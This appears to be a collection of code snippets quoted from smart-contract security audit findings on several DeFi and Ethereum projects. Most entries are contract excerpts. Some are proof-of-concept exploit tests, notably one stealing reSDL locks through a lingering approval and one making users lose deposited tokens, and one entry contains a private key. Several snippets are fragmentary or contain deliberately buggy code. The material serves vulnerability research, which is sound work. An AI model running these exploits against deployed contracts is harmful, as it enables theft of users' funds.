"```\nconst config = nodes.nodes.find((_) => _.address.toLowerCase() === adr.toLowerCase())\n\nif (!config) {\n  throw new Error(`The ${adr} does not exist within the current registered active nodeList!`)\n}\n\nconst cachedSignatures: Signature[] = []\nconst blocksToRequest = blocks.filter((b) => {\n  const s = signatureCaches.get(b.hash)\n  return s? cachedSignatures.push(s) * 0 : true\n})\n\nlet response: RPCResponse\ntry {\n  response = (blocksToRequest.length\n   ? await handler.transport.handle(config.url, {\n        id: handler.counter++ || 1,\n        jsonrpc: '2.0',\n        method: 'in3_sign',\n        params: blocksToRequest\n      })\n    : { result: [] }) as RPCResponse\n  if (response.error) {\n```"
"```\n{\n    ""privateKey"": ""0xc858a0f49ce12df65031ba0eb0b353abc74f93f8ccd43df9682fd2e2293a4db3"",\n    ""rpcUrl"": ""http://rpc-kovan.slock.it""\n}\n```\n```\nconst key = toBuffer(txargs.privateKey)\n```\n```\nconst txHash = await transport.handle(url, {\n  jsonrpc: '2.0',\n  id: idCount++,\n  method: 'eth_sendRawTransaction',\n  params: [toHex(tx.serialize())]\n}).then((response) => {\n  if (response.error) {\n    Promise.reject(new SentryError('Error sending tx', 'tx_error', `Error sending the tx ${JSON.stringify(txargs)}: ${JSON.stringify(response.error)}`));\n  } else {\n    response.result + '';\n  }\n})"
"```\nbytes32 urlHash = keccak256(bytes(_url));\n\nrequire(!urlIndex[urlHash].used && signerIndex[_signer].stage == Stages.NotInUse,\n    ""a node with the same url or signer is already registered"");\n```"
"```\nfunction removeNodeFromRegistry(address _signer)\n    external\n    onlyActiveState(_signer)\n{\n    require(block.timestamp < (blockTimeStampDeployment + YEAR_DEFINITION), ""only in 1st year"");\n    require(msg.sender == unregisterKey, ""only unregisterKey is allowed to remove nodes"");\n\n    SignerInformation storage si = signerIndex[_signer];\n    In3Node memory n = nodes[si.index];\n\n    unregisterNodeInternal(si, n);\n}\n```"
"```\nbytes32 tempHash = keccak256(\n    abi.encodePacked(\n        _url,\n        _props,\n        _timeout,\n        _weight,\n        msg.sender\n    )\n);"
"```\nfunction getParentAndBlockhash(bytes memory _blockheader) public pure returns (bytes32 parentHash, bytes32 bhash) {\n    uint8 first = uint8(_blockheader[0]);\n\n    require(first > 0xf7, ""invalid offset"");\n    uint8 offset = first - 0xf7 + 2;\n\n    assembly {\n        mstore(0x20, _blockheader)\n        parentHash := mload(add(add(mload(0x20), 0x20), offset))\n    }\n    bhash = keccak256(_blockheader);\n}"
"```\nassert(_blockNumber > _blockheaders.length)\n```\n```\nfunction removeNode(uint _nodeIndex) internal {\n    emit LogNodeRemoved(nodes[_nodeIndex].url, nodes[_nodeIndex].signer);\n    delete urlIndex[keccak256(bytes(nodes[_nodeIndex].url))];\n    uint length = nodes.length;\n    assert(length > 0);\n```\n```\nfunction registerNodeFor(\n    string calldata _url,\n    uint64 _props,\n    uint64 _timeout,\n    address _signer,\n    uint64 _weight,\n    uint8 _v,\n    bytes32 _r,\n    bytes32 _s\n) \n    external\n    payable\n{\n```\n```\nsignerInformation storage si = signerIndex[_signer];\n```\n```\nrequire(si.stage!= Stages.Convicted,\n  ""node already convicted"")\n```\n```\nrequire(!urlIndex[newURl].used, ""url is already in use"")\n```"
"```\nfor (uint i = 0; i < _blockheaders.length; i++) {\n    (calcParent, calcBlockhash) = getParentAndBlockhash(_blockheaders[i]);\n    if (calcBlockhash!= currentBlockhash) {\n        return 0x0;\n    }\n    currentBlockhash = calcParent;\n}\n```"
"```\nfunction recreateBlockheaders(uint _blockNumber, bytes[] memory _blockheaders) public {\n    bytes32 currentBlockhash = blockhashMapping[_blockNumber];\n    require(currentBlockhash!= 0x0, ""parentBlock is not available"");\n\n    bytes32 calculatedHash = reCalculateBlockheaders(_blockheaders, currentBlockhash);\n    require(calculatedHash!= 0x0, ""invalid headers"");\n```\n```\nbytes32 calculatedHash = reCalculateBlockheaders(\n    _blockheaders,\n    currentBlockhash\n)\n```\nfunction reCalculateBlockheaders(bytes[] memory _blockheaders, bytes32 _bHash) public pure returns (bytes32 bhash) {\n    bytes32 currentBlockhash = _bHash;\n    bytes32 calcParent = 0x0;\n    bytes32 calcBlockhash = 0x0;\n\n    for (uint i = 0; i < _blockheaders.length; i++) {\n        (calcParent, calcBlockhash) = getParentAndBlockhash(_blockheaders[i]);\n        if (calcBlockhash!= currentBlockhash) {\n            return 0x0;\n        }\n        currentBlockhash = calcParent;\n    }\n\n    return currentBlockhash;\n```\n```\nassert(_blockNumber > _blockheaders.length);\nuint bnr = _blockNumber - _blockheaders.length;\nblockhashMapping[bnr] = calculatedHash;\nemit LogBlockhashAdded(bnr, calculatedHash);\n```"
"```\nif (newURl!= keccak256(bytes(node.url))) {\n    if (newURl!= keccak256(bytes(node.url))) {\n        // deleting the old entry\n        delete urlIndex[keccak256(bytes(node.url))];\n\n        // make sure the new url is not already in use\n        require(!urlIndex[newURl].used, ""url is already in use"");\n\n        UrlInformation memory ui;\n        ui.used = true;\n        ui.signer = msg.sender;\n        urlIndex[newURl] = ui;\n        node.url = newURl;\n    }\n}\n```\nemit LogNodeRegistered(\n    node.url,\n    _props,\n    msg.sender,\n    node.deposit\n);\n```\nevent LogNodeRegistered(\n    string url,\n    uint props,\n    address signer,\n    uint deposit\n);"
"```\nmodifier onlyActiveState(address _signer) {\n    SignerInformation memory si = signerIndex[_signer];\n    require(si.stage == Stages.Active, ""address is not an in3-signer"");\n\n    In3Node memory n = nodes[si.index];\n    assert(nodes[si.index].signer == _signer);\n}\n```"
"```\nstruct SignerInformation {\n    uint64 lockedTime;  // timestamp until the deposit of an in3-node can not be withdrawn after the node was removed\n    address owner;       // the owner of the node\n\n    Stages stage;        // state of the address\n\n    uint depositAmount;  // amount of deposit to be locked, used only after a node had been removed\n\n    uint index;         // current index-position of the node in the node-array\n}\n```\n```\nIn3Node memory m = nodes[length - 1];\nnodes[_nodeIndex] = m;\n\nSignerInformation storage si = signerIndex[m.signer];\nsi.index = uint64(_nodeIndex);\nnodes.length--;\n```"
"```\nrequire(first > 0xf7, ""invalid offset"");\nuint8 offset = first - 0xf7 + 2;\n\nassembly {\n    mstore(0x20, _blockheader)\n\n    parentHash := mload(\n        add(\n            add(mload(0x20), 0x20),\n            offset\n        )\n    )\n}\n```"
"```\nfunction saveBlockNumber(uint _blockNumber) public {\n    bytes32 bHash = blockhash(_blockNumber);\n\n    require(bHash!= 0x0, ""block not available"");\n\n    blockhashMapping[_blockNumber] = bHash;\n    emit LogBlockhashAdded(_blockNumber, bHash);\n}\n```\n```\nblockhashMapping[bnr] = calculatedHash;\n```"
"```\nfunction confirmTransaction(uint256 transactionId)\n    public\n    ownerExists(msg.sender)\n    transactionExists(transactionId)\n    notConfirmed(transactionId, msg.sender)\n    notFullyConfirmed(transactionId)\n{\n    confirmations[transactionId][msg.sender] = true;\n    emit Confirmation(msg.sender, transactionId);\n    if (isConfirmed(transactionId)) {\n        _setConfirmationTime(transactionId, block.timestamp);\n    }\n}\n```\n```\nfunction revokeConfirmation(uint256 transactionId)\n    public\n    ownerExists(msg.sender)\n    confirmed(transactionId, msg.sender)\n    notExecuted(transactionId)\n{\n    confirmations[transactionId][msg.sender] = false;\n    emit Revocation(msg.sender, transactionId);\n}\n```"
"```\naddress makerAddress = order.makerAddress;\nif (orderInfo.orderTakerAssetFilledAmount == 0 ||\n    _doesSignatureRequireRegularValidation(\n        orderInfo.orderHash,\n        makerAddress,\n        signature\n    )\n) {\n```\n```\nfunction _doesSignatureRequireRegularValidation(\n    bytes32 hash,\n    address signerAddress,\n    bytes memory signature\n)\n    internal\n    pure\n    returns (bool needsRegularValidation)\n{\n    SignatureType signatureType = _readSignatureType(\n        hash,\n        signerAddress,\n        signature\n    );\n\n    needsRegularValidation =\n        signatureType == SignatureType.Wallet ||\n        signatureType == SignatureType.Validator ||\n        signatureType == SignatureType.EIP1271Wallet;\n    return needsRegularValidation;\n}\n```"
"```\nfunction executeTransaction(uint256 transactionId)\n    public\n    notExecuted(transactionId)\n    fullyConfirmed(transactionId)\n```\n```\nfunction isConfirmed(uint256 transactionId)\n    public\n    view\n    returns (bool)\n{\n    uint256 count = 0;\n    for (uint256 i = 0; i < owners.length; i++) {\n        if (confirmations[transactionId][owners[i]]) {\n            count += 1;\n        }\n        if (count == required) {\n            return true;\n        }\n    }\n    return false;\n}\n```\n```\nfunction confirmTransaction(uint256 transactionId)\n    public\n    ownerExists(msg.sender)\n    transactionExists(transactionId)\n    notConfirmed(transactionId, msg.sender)\n    notFullyConfirmed(transactionId)\n{\n    confirmations[transactionId][msg.sender] = true;\n    emit Confirmation(msg.sender, transactionId);\n    if (isConfirmed(transactionId)) {\n        _setConfirmationTime(transactionId, block.timestamp);\n    }\n}\n```"
"```\naddress currentContextAddress = currentContextAddress;\nif (currentContextAddress!= address(0)) {\n    LibRichErrors.revert(LibExchangeRichErrors.TransactionInvalidContextError(\n        transactionHash,\n        currentContextAddress_\n    ));\n}\n```"
"```\nbytes memory fillOrderCalldata = abi.encodeWithSelector(\n    IExchangeCore(address(0)).fillOrder.selector,\n    order,\n    takerAssetFillAmount,\n    signature\n);\n\n(bool didSucceed, bytes memory returnData) = address(this).delegatecall(fillOrderCalldata);\n```\n```\n(bool didSucceed, bytes memory returnData) = verifyingContractAddress.staticcall(callData);\n```"
"```\nfunction matchOrders(\n    LibOrder.Order memory leftOrder,\n    LibOrder.Order memory rightOrder,\n    bytes memory leftSignature,\n    bytes memory rightSignature\n) {\n}"
"```\naddress signerAddress = transaction.signerAddress;\n_setCurrentContextAddressIfRequired(signerAddress, signerAddress)\n```\n```\nfunction registerAssetProxy(address assetProxy)\n    external\n    onlyOwner\n{\n    bytes4 assetProxyId = IAssetProxy(assetProxy).getProxyId();\n    address currentAssetProxy = _assetProxies[assetProxyId];\n    if (currentAssetProxy!= address(0)) {\n        LibRichErrors.revert(LibExchangeRichErrors.AssetProxyExistsError(\n            assetProxyId,\n            currentAssetProxy\n        ));\n    }\n\n    _assetProxies[assetProxyId] = assetProxy;\n    emit AssetProxyRegistered(assetProxyId, assetProxy);\n}\n```\n```\nfunction _assertSenderIsOwner() internal view {\n    if (msg.sender!= owner) {\n        LibRichErrors.revert(LibOwnableRichErrors.OnlyOwnerError(\n            msg.sender,\n            owner\n        ));\n    }\n}"
"```\nstruct ZeroExTransaction {\n    uint256 salt;  // Arbitrary number to ensure uniqueness of transaction hash.\n    uint256 expirationTimeSeconds;  // Timestamp in seconds at which transaction expires.\n    uint256 gasPrice;  // gasPrice that transaction is required to be executed with.\n    address signerAddress;  // Address of transaction signer.\n    bytes data;  // AbiV2 encoded calldata.\n}\n```\n```\ntransactionsExecuted[transactionHash] = true;\n\n(bool didSucceed, bytes memory returnData) = address(this).delegatecall(transaction.data);\n```"
```\nnon_reentrant\nrefund_final_balance\n```
"```\nif (b.length < index + nestedBytesLength):\n    LibRichErrors.rrevert(\n        LibBytesRichErrors.InvalidByteOperationError(\n            LibBytesRichErrors.InvalidByteOperationErrorCodes.LengthGreaterThanOrEqualsNestedBytesLengthRequired,\n            b.length,\n            index + nestedBytesLength\n        )\n    )\n```"
"```\nif (uint8(signatureType) >= uint8(SignatureType.NSignatureTypes)):\n    LibRichErrors.rrevert(\n        LibExchangeRichErrors.SignatureError(\n            LibExchangeRichErrors.SignatureErrorCodes.UNSUPPORTED,\n            hash,\n            signerAddress,\n            signature\n        )\n    )\n```"
"```\nfunction provideSecret(bytes32 sale, bytes32 secret_) external {\n    require(sales[sale].set);\n    if (sha256(abi.encodePacked(secret_)) == secretHashes[sale].secretHashA) {\n        secretHashes[sale].secretA = secret_;\n    } else if (sha256(abi.encodePacked(secret_)) == secretHashes[sale].secretHashB) {\n        secretHashes[sale].secretB = secret_;\n    } else if (sha256(abi.encodePacked(secret_)) == secretHashes[sale].secretHashC) {\n        secretHashes[sale].secretC = secret_;\n    } else if (sha256(abi.encodePacked(secret_)) == secretHashes[sale].secretHashD) {\n        secretHashes[sale].secretD = secret_;\n    } else {\n        revert();\n    }\n}\n```\n```\nfunction accept(bytes32 sale) external {\n    require(!accepted(sale));\n    require(!off(sale));\n    require(hasSecrets(sale));\n    require(sha256(abi.encodePacked(secretHashes[sale].secretD)) == secretHashes[sale].secretHashD);\n```"
"```\nfunction create(\n    uint256 maxLoanDur_,\n    uint256 maxFundDur_,\n    address arbiter_,\n    bool compoundEnabled_,\n    uint256 amount_\n) external returns (bytes32 fund) {\n    require(fundOwner[msg.sender].lender!= msg.sender || msg.sender == deployer);\n    // Only allow one loan fund per address\n```\n```\nfunction createCustom(\n    uint256 minLoanAmt_,\n    uint256 maxLoanAmt_,\n    uint256 minLoanDur_,\n    uint256 maxLoanDur_,\n    uint256 maxFundDur_,\n    uint256 liquidationRatio_,\n    uint256 interest_,\n    uint256 penalty_,\n    uint256 fee_,\n    address arbiter_,\n    bool compoundEnabled_,\n    uint256 amount_\n) external returns (bytes32 fund) {\n    require(fundOwner[msg.sender].lender!= msg.sender || msg.sender == deployer);\n    // Only allow one loan fund per address\n```"
```\nif (maxLoanDur(fund) > 0) {\n    require(loanDur <= maxLoanDur(fund));\n} else {\n    require(now + loanDur <= maxFundDur(fund));\n}\n```
"```\nfunction update(\n    bytes32 fund,\n    uint256 minLoanAmt_,\n    uint256 maxLoanAmt_,\n    uint256 minLoanDur_,\n    uint256 maxLoanDur_,\n    uint256 maxFundDur_,\n    uint256 interest_,\n    uint256 penalty_,\n    uint256 fee_,\n    uint256 liquidationRatio_,\n    address arbiter_\n) external {\n    require(msg.sender == lender(fund));\n    funds[fund].minLoanAmt = minLoanAmt_;\n    funds[fund].maxLoanAmt = maxLoanAmt_;\n    funds[fund].minLoanDur = minLoanDur_;\n    funds[fund].maxLoanDur = maxLoanDur_;\n    funds[fund].maxFundDur = maxFundDur_;\n    funds[fund].interest = interest_;\n    funds[fund].penalty = penalty_;\n    funds[fund].fee = fee_;\n    funds[fund].liquidationRatio = liquidationRatio_;\n    funds[fund].arbiter = arbiter_;\n}\n```"
"```\nfunction setContractAddress(bytes32 name, address addr) public returns (bool) {\n    require(name > 0x0000000000000000000000000000000000000000000000000000000000000000, ""Contract name must not be empty."");\n    require(isAuthorized(msg.sender), ""Not authorized to update contract registry."");\n\n    ContractDetails memory info = registry[name];\n\n    if (info.contractAddress == address(0)) {\n        info = ContractDetails({\n            owner: msg.sender,\n            contractAddress: addr\n        });\n\n        contractKeys.push(name);\n    } else {\n        info.contractAddress = addr;\n    }\n\n    registry[name] = info;\n\n    emit RegistryUpdated(addr, name);\n\n    return true;\n}"
```\nprivate string ingressContractAddress;\n```\nAccountIngress ingressContract = AccountIngress(ingressContractAddress)\n```\n```\nconstructor(address ingressAddress) public {\n```\n```\nprivate string nodeIngressContractAddress;
```\nfor (uint i = 0; i < contractKeys.length; i++) {\n    if (contractKeys[i] == name) {\n        delete registry[contractKeys[i]];\n        contractKeys[i] = contractKeys[contractKeys.length - 1];\n        delete contractKeys[contractKeys.length - 1];\n        contractKeys.length--;\n    }\n```
```\nstruct ContractDetails {\n    address owner;\n    address contractAddress;\n}\n\nmapping(bytes32 => ContractDetails) public registry;\n```
"```\nfunction testnew_GaugePointAdjustment() public {\n    uint256 currentGaugePoints = 1189;\n    uint256 optimalPercentDepositedBdv = 64;\n    uint256 percentOfDepositedBdv = 64;\n\n    uint256 newGaugePoints = gaugePointFacet.defaultGaugePointFunction(\n        currentGaugePoints,\n        optimalPercentDepositedBdv,\n        percentOfDepositedBdv\n    );\n\n    assertTrue(newGaugePoints <= MAX_GAUGE_POINTS, ""New gauge points exceed the maximum allowed"");\n    assertEq(newGaugePoints, currentGaugePoints, ""Gauge points adjustment does not match expected outcome"");\n}\n```"
"```\nAdditional tokens may be added to the Deposit Whitelist via Beanstalk governance. In order for a token to be added to the Deposit Whitelist, Beanstalk requires:\n    1. The token address;\n    2. A function to calculate the Bean Denominated Value (BDV) of the token (see Section 14.2 of the whitepaper for complete formulas); and\n    3. The number of Stalk and Seeds per BDV received upon Deposit.\n```"
"```\nrequire(s.ss[token].milestoneSeason == 0, ""Whitelist: Token already whitelisted"")\n```"
```\n/**\n * @notice Returns the percentage that Unripe Beans have been recapitalized.\n */\nfunction percentBeansRecapped() internal view returns (uint256 percent) {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    return s.u[C.UNRIPE_BEAN].balanceOfUnderlying.mul(DECIMALS).div(C.unripeBean().totalSupply());\n}\n\n/**\n * @notice Returns the percentage that Unripe LP have been recapitalized.\n */\nfunction percentLPRecapped() internal view returns (uint256 percent) {\n    AppStorage storage s = LibAppStorage.diamondStorage();\n    return C.unripeLPPerDollar().mul(s.recapitalized).div(C.unripeLP().totalSupply());\n}\n```
"```\nfunction updateTemperature(int8 bT, uint256 caseId) private {\n    uint256 t = s.w.t;\n    if (bT < 0) {\n        if (t <= uint256(-bT)) {\n            bT = 1 - int8(t);\n            s.w.t = 1;\n        } else {\n            s.w.t = uint32(t - uint256(-bT));\n        }\n    } else {\n        s.w.t = uint32(t + uint256(bT));\n    }\n\n    emit TemperatureChange(s.season.current, caseId, bT);\n}\n```\n```\nfunction gm(address account, LibTransfer.To mode) public payable returns (uint256) {\n    int256 deltaB = stepOracle(); // @audit here if oracle failed, we update the season.timestamp and return deltaB zero here\n    uint256 caseId = calcCaseIdandUpdate(deltaB); // @audit caseId will be 3 here if deltaB is zero\n    LibGerminate.endTotalGermination(season, LibWhitelistedTokens.getWhitelistedTokens());\n    LibGauge.stepGauge();\n    stepSun(deltaB, caseId);\n}\n```\n```\npragma solidity ^0.7.6;\npragma abicoder v2;\n\nimport ""contracts/beanstalk/sun/SeasonFacet/Sun.sol"";\nimport ""contracts/mocks/mockFacets/MockSeasonFacet.sol"";\nimport ""contracts/mocks/mockFacets/MockSiloFacet.sol"";\nimport ""contracts/mocks/mockFacets/MockFieldFacet.sol"";\nimport ""contracts/mocks/mockFacets/MockWhitelistFacet.sol"";\nimport ""contracts/libraries/Silo/LibWhitelist.sol"";\nimport ""./utils/Utils.sol"";\nimport ""./utils/TestHelper.sol"";\nimport ""contracts/libraries/LibSafeMath32.sol"";\nimport ""contracts/C.sol"";\n\ncontract SeasonTemperatureTest is MockSeasonFacet, TestHelper {\n    using SafeMath for uint256;\n    using LibSafeMath32 for uint32;\n\n    bool oracleFailed;\n\n    function setUp() public {\n        console.log(""diamondSetup"");\n        vm.createSelectFork('local');\n        oracleFailed = false;\n        setupDiamond();\n        dewhitelistCurvePool();\n        mintUnripeLPToUser1();\n        mintUnripeBeanToUser1();\n        setOraclePrices(false, 1000e6, 1000e6, 1000e6);\n        _setReservesForWell(1000000e6, 1000e18);\n\n        mintTokenForUsers();\n        setTokenApprovalForUsers();\n\n        enableFertilizerAndMintActiveFertilizers();\n\n        callSunriseForUser1();\n    }\n\n    function setTokenApprovalForUsers() internal {\n        approveTokensForUser(deployer);\n        approveTokensForUser(user1);\n        approveTokensForUser(user2);\n        approveTokensForUser(user3);\n        approveTokensForUser(user4);\n        approveTokensForUser(user5);\n    }\n\n    function mintTokenForUsers() internal {\n        mintWETHtoUser(deployer);\n        mintWETHtoUser(user1);\n        mintWETHtoUser(user2);\n        mintWETHtoUser(user3);\n        mintWETHtoUser(user4);\n        mintWETHtoUser(user5);\n\n        C.bean().mint(deployer, 10e6);\n        C.bean().mint(user1, 10e6);\n        C.bean().mint(user2, 10e6);\n        C.bean().mint(user3, 10e6);\n        C.bean().mint(user4, 10e6);\n        C.bean().mint(user5,\n```\nhandleRain caseId: 0\n------------ Results --------------\n\nthisSowTime: 4294967295\nlastSowTime: 4294967295\ngetUsdTokenPrice: 1\ngetReserve0: 1\ngetReserve1: 1\ngetAbovePeg: false\ngetSoil: 462832752243\nlastDSoil: 0\ns.w.t: 5\nremaining pods: 467461079765\n\nhandleRain caseId: 3\n------------ Results --------------\n\nthisSowTime: 4294967295\nlastSowTime: 4294967295\ngetUsdTokenPrice: 1\ngetReserve0: 1\ngetReserve1: 1\ngetAbovePeg: false\ngetSoil: 0\nlastDSoil: 0\ns.w.t: 1\nremaining pods: 0\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 29.45s (3.32ms CPU time)\n```"
"```\nfunction checkForInvalidTimestampOrAnswer(\n    uint256 timestamp,\n    int256 answer,\n    uint256 currentTimestamp\n) private pure returns (bool) {\n    if (timestamp == 0 || timestamp > currentTimestamp) {\n        return true;\n    }\n    if (currentTimestamp.sub(timestamp) > CHAINLINK_TIMEOUT) {\n        return true;\n    }\n    if (answer <= 0) {\n        return true;\n    }\n}\n```\n```\nuint256 public constant CHAINLINK_TIMEOUT = 14400;\n```"
"```\nfunction getRoundData(uint80 _roundId)\n    public\n    view\n    virtual\n    override\n    returns (\n        uint80 roundId,\n        int256 answer,\n        uint256 startedAt,\n        uint256 updatedAt,\n        uint80 answeredInRound\n    ) {\n    (uint16 phaseId, uint64 aggregatorRoundId) = parseIds(_roundId);\n\n    (\n        uint80 roundId,\n        int256 answer,\n        uint256 startedAt,\n        uint256 updatedAt,\n        uint80 ansIn\n    ) = phaseAggregators[phaseId].getRoundData(aggregatorRoundId);\n\n    return addPhaseIds(roundId, answer, startedAt, updatedAt, ansIn, phaseId);\n}\n```\n```\nfunction latestRoundData()\n    public\n    view\n    virtual\n    override\n    returns (\n        uint80 roundId,\n        int256 answer,\n        uint256 startedAt,\n        uint256 updatedAt,\n        uint80 answeredInRound\n    ) {\n    Phase memory current = currentPhase; // cache storage reads\n\n    (\n        uint80 roundId,\n        int256 answer,\n        uint256 startedAt,\n        uint256 updatedAt,\n        uint80 ansIn\n    ) = current.aggregator.latestRoundData();\n\n    return addPhaseIds(roundId, answer, startedAt, updatedAt, ansIn, current.id);\n}\n```"
"```\nfunction handleOutgoingRESDL(\n    address _sender,\n    uint256 _lockId,\n    address _sdlReceiver\n)\n    external\n    onlyCCIPController\n    onlyLockOwner(_lockId, _sender)\n    updateRewards(_sender)\n    updateRewards(ccipController)\n    returns (Lock memory)\n{\n    Lock memory lock = locks[_lockId];\n\n    delete locks[_lockId].amount;\n    delete lockOwners[_lockId];\n    balances[_sender] -= 1;\n\n    uint256 totalAmount = lock.amount + lock.boostAmount;\n    effectiveBalances[_sender] -= totalAmount;\n    effectiveBalances[ccipController] += totalAmount;\n\n    sdlToken.safeTransfer(_sdlReceiver, lock.amount);\n\n    emit OutgoingRESDL(_sender, _lockId);\n\n    return lock;\n}\n```\n```\nit('PoC steal reSDL', async () => {\n  let lockId = 2;\n\n  let thief = accounts[0];\n  let victim = accounts[1];\n\n  let thiefAccount2 = accounts[2];\n\n  let ts = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp;\n\n  // Thief approves an alt account that he controls to move his lock in the original chain\n  await sdlPool.approve(thiefAccount2, lockId);\n\n  assert.equal(await sdlPool.getApproved(2), thiefAccount2);\n\n  // Thief bridges the lock to an other chain but the approval is not deleted\n  await bridge.transferRESDL(77, victim, lockId, true, toEther(10), { value: toEther(10) });\n  let lastRequestMsg = await onRamp.getLastRequestMessage();\n  assert.deepEqual(\n    ethers.utils.defaultAbiCoder\n     .decode(\n        ['address', 'uint256', 'uint256', 'uint256', 'uint64', 'uint64', 'uint64'],\n        lastRequestMsg[1]\n      )\n     .map((d, i) => {\n        if (i == 0) return d;\n        if (i > 1 && i < 4) return fromEther(d);\n        return d.toNumber();\n      }),\n    [victim, lockId, 1000, 1000, ts, 365 * 86400, 0]\n  );\n  assert.deepEqual(\n    lastRequestMsg[2].map((d) => [d.token, fromEther(d.amount)]),\n    [[sdlToken.address, 1000]]\n  );\n  assert.equal(lastRequestMsg[3], wrappedNative.address);\n  assert.equal(lastRequestMsg[4], '0x11');\n  await expect(sdlPool.ownerOf(lockId)).to.be.revertedWith('InvalidLockId()');\n\n  // The user that received the lock from bridging on the other chain decides to bridge the lock id\n  // back to the original chain\n  await offRamp\n   .connect(signers[6])\n   .executeSingleMessage(\n      ethers.utils.formatBytes32String('messageId'),\n      77,\n      ethers.utils.defaultAbiCoder.encode(\n        ['address', 'uint256', 'uint256', 'uint256', 'uint64', 'uint64', 'uint64'],\n        [victim, lockId, 1000, 1000, ts, 365 *"
"```\ndef any_message(\n    _receiver,\n    tokenAmounts,\n    _feeTokenAddress\n):\n    client.EVM2AnyMessage memory evm2AnyMessage = client.EVM2AnyMessage({\n        receiver: abi.encode(_receiver),\n        data: """",\n        tokenAmounts: tokenAmounts,\n        extraArgs: ""0x"",\n        feeToken: _feeTokenAddress\n    })\n\n    return evm2AnyMessage\n```"
"```\nit.only('renounce ownership', async () => {\n    console.log(""Owner before"", await controller.owner())\n    await controller.setMaxLINKFee(toEther(100))\n    console.log(""Set max link fee with onlyOwner modifier"", await controller.maxLINKFee())\n\n    await expect(controller.renounceOwnership())\n    await expect(controller.setMaxLINKFee(toEther(200))).to.be.revertedWith('Ownable: caller is not the owner')\n    console.log(""set max link fee hasn't changed"", await controller.maxLINKFee())\n    console.log(""Owner after"", await controller.owner())\n})"
"```\nfunction setApprovalForAll(address _operator, bool _approved) external {\n    address owner = msg.sender;\n    if (owner == _operator) {\n        revert ApprovalToCaller();\n    }\n\n    operatorApprovals[owner][_operator] = _approved;\n    emit ApprovalForAll(owner, _operator, _approved);\n}\n```\n```\nfunction approve(address _to, uint256 _lockId) external {\n    address owner = ownerOf(_lockId);\n\n    if (_to == owner) {\n        revert ApprovalToCurrentOwner();\n    }\n    if (msg.sender!= owner &&!isApprovedForAll(owner, msg.sender)) {\n        revert SenderNotAuthorized();\n    }\n\n    tokenApprovals[_lockId] = _to;\n    emit Approval(owner, _to, _lockId);\n}\n```"
"```\nit('PoC user will lose extra deposited tokens', async () => {\n  let user = accounts[1];\n  let initialUserSDLBalance = await sdlToken.balanceOf(user);\n\n  await sdlToken.connect(signers[1]).transferAndCall(\n    sdlPool.address,\n    toEther(100),\n    ethers.utils.defaultAbiCoder.encode(['uint256', 'uint64'], [0, 0])\n  );\n\n  await sdlPool.handleOutgoingUpdate();\n  await sdlPool.handleIncomingUpdate(1);\n  await sdlPool.connect(signers[1]).executeQueuedOperations([]);\n\n  assert.equal(await sdlPool.ownerOf(1), user);\n\n  await sdlPool.connect(signers[1]).withdraw(1, toEther(100));\n\n  await sdlToken.connect(signers[1]).transferAndCall(\n    sdlPool.address,\n    toEther(1000),\n    ethers.utils.defaultAbiCoder.encode(['uint256', 'uint64'], [1, 0])\n  );\n\n  await sdlPool.handleOutgoingUpdate();\n  await sdlPool.handleIncomingUpdate(2);\n\n  await sdlPool.connect(signers[1]).executeQueuedOperations([1]);\n\n  let finalUserSDLBalance = await sdlToken.balanceOf(user);\n  let sdlLost = initialUserSDLBalance.sub(finalUserSDLBalance);\n\n  console.log(""The user has lost"", sdlLost.toString(), ""sdl tokens"");\n\n  await expect(sdlPool.ownerOf(1)).to.be.revertedWith('InvalidLockId()');\n})\n```\nSDLPoolSecondary\nThe user has lost 1000000000000000000000 sdl tokens\n✔ PoC user is not able to execute his lock updates (159ms)\n\n1 passing (3s)\n```"
"```\nnpx hardhat test \n  --network hardhat \n  --grep 'usage of Attack contract and receiving NFT'\n```\n```\nimport { Signer } from 'ethers';\nimport { assert, expect } from 'chai';\nimport {\n  toEther,\n  deploy,\n  getAccounts,\n  setupToken,\n  fromEther,\n  deployUpgradeable,\n} from '../../utils/helpers';\nimport {\n  ERC677,\n  LinearBoostController,\n  RewardsPool,\n  SDLPoolPrimary,\n  StakingAllowance,\n  Attacker,\n} from '../../../typechain-types';\nimport { ethers } from 'hardhat';\nimport { time } from '@nomicfoundation/hardhat-network-helpers';\n\nconst DAY = 86400;\n\nconst parseLocks = (locks: any) =>\n  locks.map((l: any) => ({\n    amount: fromEther(l.amount),\n    boostAmount: Number(fromEther(l.boostAmount).toFixed(10)),\n    startTime: l.startTime.toNumber(),\n    duration: l.duration.toNumber(),\n    expiry: l.expiry.toNumber(),\n  }));\n\nconst parseData = (data: any) => ({\n  operator: data.operator,\n  from: data.from,\n  tokenId: data.tokenId,\n  data: Buffer.from(data.data.slice(2), 'hex').toString('utf8'),\n});\n\ndescribe('SDLPoolPrimary', () => {\n  let sdlToken: StakingAllowance;\n  let rewardToken: ERC677;\n  let rewardsPool: RewardsPool;\n  let boostController: LinearBoostController;\n  let sdlPool: SDLPoolPrimary;\n  let signers: Signer[];\n  let accounts: string[];\n  let attacker: Attacker;\n\n  before(async () => {\n    ({ signers, accounts } = await getAccounts());\n  });\n\n  beforeEach(async () => {\n    sdlToken = (await deploy('StakingAllowance', ['stake.link', 'SDL'])) as StakingAllowance;\n    rewardToken = (await deploy('ERC677', ['Chainlink', 'LINK', 1000000000])) as ERC677;\n\n    await sdlToken.mint(accounts[0], toEther(1000000));\n    await setupToken(sdlToken, accounts);\n\n    boostController = (await deploy('LinearBoostController', [4 * 365 * DAY, 4])) as LinearBoostController;\n\n    sdlPool = (await deployUpgradeable('SDLPoolPrimary', [\n      'Reward Escrowed SDL',\n     'reSDL',\n      sdlToken.address,\n      boostController.address,\n    ])) as SDLPoolPrimary;\n\n    rewardsPool = (await deploy('RewardsPool', [s"
